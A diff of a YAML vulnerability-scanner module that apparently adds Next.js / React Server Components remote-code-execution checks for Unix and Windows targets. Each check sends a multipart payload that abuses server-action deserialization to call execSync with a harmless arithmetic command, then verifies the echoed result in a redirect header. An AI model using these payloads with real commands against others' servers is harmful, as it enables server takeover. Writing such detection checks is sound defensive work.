@@ -51,13 +51,45 @@ payloads:
               ports:
                 - 80
                 - 443
-        data: "--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n\"$1\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$4\",\"value\":\"{{\\\"then\\\":\\\"$3:map\\\",\\\"0\\\":{{\\\"then\\\":\\\"$B3\\\"}},\\\"length\\\":1}}\",\"then\":\"$2:then\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n\"$@3\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n[]\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"4\"\r\n\r\n{{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});//\",\"_formData\":{{\"get\":\"$3:constructor:constructor\"}},\"_chunks\":\"$2:_response:_chunks\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad--\r\n"
+        data: "--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n\"$1\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$4\",\"value\":\"{{\\\"then\\\":\\\"$3:map\\\",\\\"0\\\":{{\\\"then\\\":\\\"$B3\\\"}},\\\"length\\\":1}}\",\"then\":\"$2:then\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n\"$@3\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n[]\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"4\"\r\n\r\n{{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});\",\"_formData\":{{\"get\":\"$3:constructor:constructor\"}},\"_chunks\":\"$2:_response:_chunks\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad--\r\n"
         response:
           condition_type: and
           conditions:
             status_code:
               regex: "307"
               reverse: false
-            header:
-              regex: "Location.*11111"
+            headers:
+              x-action-redirect:
+                regex: "/login\\?a=11111"
+                reverse: false
+      - method: post
+        timeout: 10
+        headers:
+          User-Agent: "{user_agent}"
+          next-action: "x"
+          Content-Type: "multipart/form-data; boundary=WebKitFormBoundaryx2pO7Ptc6DDP3Bad"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: "--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n\"$1\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$4\",\"value\":\"{{\\\"then\\\":\\\"$3:map\\\",\\\"0\\\":{{\\\"then\\\":\\\"$B3\\\"}},\\\"length\\\":1}}\",\"then\":\"$2:then\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n\"$@3\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n[]\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"4\"\r\n\r\n{{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('powershell -c \\\"41*271\\\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});\",\"_formData\":{{\"get\":\"$3:constructor:constructor\"}},\"_chunks\":\"$2:_response:_chunks\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad--\r\n"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "307"
               reverse: false
+            headers:
+              x-action-redirect:
+                regex: "/login\\?a=11111"
+                reverse: false
